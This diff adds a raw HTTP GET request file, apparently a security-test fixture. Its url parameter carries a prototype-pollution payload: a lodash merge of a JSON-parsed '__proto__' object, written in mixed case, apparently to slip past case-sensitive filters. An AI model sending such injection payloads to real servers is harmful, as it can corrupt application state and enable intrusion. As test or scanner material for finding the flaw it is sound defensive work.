@@ -1,0 +1,4 @@
+GET /a?url=_.mErGe({},%20JsOn.PaRsE('{"__pRoTo__":{"X":1}}')) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
